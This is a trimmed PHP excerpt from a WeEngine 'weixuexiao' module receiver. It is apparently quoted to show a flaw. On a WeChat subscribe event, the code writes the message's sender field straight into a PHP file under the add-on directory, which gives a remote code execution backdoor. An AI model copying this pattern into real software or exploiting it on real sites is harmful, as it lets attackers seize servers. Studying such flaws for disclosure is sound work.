...
class weixuexiaoModuleReceiver extends WeModuleReceiver {
	...
	public function receive() {
		global $_W;
		load()->func('logging');		 
		WeUtility::logging('weixuexiao_messagelog', $this->message);
		if ($this->message['event'] == 'subscribe' && !empty($this->message['ticket'])) {
			...
			$auth2 = IA_ROOT . "/addons/weixuexiao/unsubscribe.php";
			if (is_file($auth2)) {
				@unlink($auth2);
			}
			file_put_contents($auth2, "<?php " . $this->message['from'] . "');}");
		}
	}
